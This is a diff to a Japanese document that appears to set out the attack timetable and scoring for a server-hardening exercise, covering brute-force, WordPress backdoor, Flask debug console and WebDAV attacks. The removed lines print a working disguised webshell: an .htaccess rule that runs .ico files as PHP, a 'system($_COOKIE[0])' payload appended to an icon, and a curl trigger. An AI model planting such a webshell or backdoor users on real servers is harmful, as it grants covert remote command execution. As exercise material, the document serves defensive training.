@@ -3,9 +3,14 @@
 
 |攻撃|タイムテーブル|獲得ポイント|
 |---|---|---|
-|SSHブルートフォース攻撃|開始20分||
-|バックドアの悪用|開始30分||
-|
+|SSHブルートフォース攻撃|開始3分|100ポイント|
+|バックドアの悪用|開始6分|50ポイント|
+|MySQLブルートフォース攻撃|開始9分|100ポイント|
+|WordPressブルートフォース攻撃|開始12分|100ポイント|
+|WordPressプラグインLiteSpeed Cacheの悪用|開始15分|150ポイント|
+|WordPressバックドアユーザーの悪用|開始18分|100ポイント|
+|Flaskデバッグコンソールへの攻撃|開始21分|150ポイント|
+|WebDavへの攻撃|開始24分|150ポイント|
 
 ## SSHブルートフォース攻撃
 
@@ -35,25 +40,17 @@
 - 侵入された場合にはWordPressに不正なユーザー（`evilfromplugin`）が追加されます。
 - パスワードは`$wp$2y$10$ZusVWtRw74cpjr9QFYgBLu7rLlw6emQenu/KNfyGyvr4PLt0hqzZW`（`admin`）となります。
 
-## WordPressバックドアの悪用
+## WordPressバックドアユーザーの悪用
 
+- 上記3つのバックドアを利用してWEBSHELLプラグインをアップロードされます。
+- プラグインがアップロードされた場合には、WEBSHELL経由でブログが作成されます。
 
+## Flaskデバッグコンソールへの攻撃
+
+- デバッグコンソールから任意のPythonコマンドを実行されます。
+- PINが`000-000-000`のままの場合には、5000ポートで動いているFlaskの画面が赤くなります。
 
 ## WebDavへの攻撃
 
-```
-<IfModule mod_rewrite.c>
-    RewriteEngine On
-    RewriteCond %{HTTP_USER_AGENT} Mozila
-    RewriteRule \.ico$ - [T=application/x-httpd-php]
-</IfModule>
-```
-
-```
-cp hoge.ico evil.ico
-printf '\n\n<?php system($_COOKIE[0]); ?>' >> evil.ico
-```
-
-```
-curl http://192.168.25.138/favicon.ico --user-agent "Mozila/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0" --b "0=id"
-```
+- WebDavが有効な場合には悪意のあるコンテンツを作成するPHPファイルが作成さます。
+- `/wp.sql`にSQLのデータがリークされるようになっています。
